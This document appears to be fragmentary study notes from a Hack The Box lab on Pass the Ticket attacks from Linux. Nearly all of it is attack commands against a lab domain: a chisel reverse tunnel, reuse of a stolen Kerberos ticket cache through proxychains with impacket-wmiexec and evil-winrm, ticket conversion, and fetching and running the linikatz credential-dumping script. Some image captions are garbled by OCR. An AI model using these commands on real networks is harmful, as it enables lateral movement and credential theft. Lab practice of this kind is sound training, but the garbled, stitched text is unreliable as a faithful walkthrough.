...
![FreeSOP: 10.129 204-23](Attachments/6B7A0DC7-F35F-4637-BB7E-14DF58194E45.jpg)  
...
### Pass the Ticket (PtT) from Linux  
```
Pavlo142@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
...
![Free Password Hash Crackeri](Attachments/4BCB7377-29D8-4B2A-8810-7CAE932A2CE9.jpg)  
...
Pass the Ticket (PtT) from Linux  
```
Pavlo142@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
...
Pass the Ticket (PtT) from Linux  
```
Pavlo142@htb[/htb]$ cat /etc/hosts
...
Pass the Ticket (PtT) from Linux  
```
Pavlo142@htb[/htb]$ cat /etc/proxychains.conf
...
Pass the Ticket (PtT) from Linux  
```
Pavlo142@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
Pavlo142@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
Pavlo142@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
Pavlo142@htb[/htb]$ sudo ./chisel server --reverse 
...
Pass the Ticket (PtT) from Linux  
```
Pavlo142@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
...
Pass the Ticket (PtT) from Linux  
```
Pavlo142@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
...
Pass the Ticket (PtT) from Linux  
```
Pavlo142@htb[/htb]$ proxychains impacket-wmiexec dc01 -k
...
Pass the Ticket (PtT) from Linux  
```
Pavlo142@htb[/htb]$ sudo apt-get install krb5-user -y
...
![Default Kerberos version 5 reale:](Attachments/5F26A80C-4190-4D6B-B119-B355FC212362.jpg)  
The Kerberos servers can be empty.  
## Administrative server for your Kerberos realm  
![Enter the nostrase of the adassistrative passor ting i perver 10 a MANtREICHT ATE Karberos reste](Attachments/BF57B40B-92B6-489B-A5DD-E0605A477FAF.jpg)  
...
Pass the Ticket (PtT) from Linux  
```
Pavlo142@htb[/htb]$ cat /etc/krb5.conf
...
Pass the Ticket (PtT) from Linux  
```
Pavlo142@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
...
Pass the Ticket (PtT) from Linux  
```
Pavlo142@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
...
Pass the Ticket (PtT) from Linux  
```
Pavlo142@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
Pavlo142@htb[/htb]$ /opt/linikatz.sh
 _ _       _ _         _
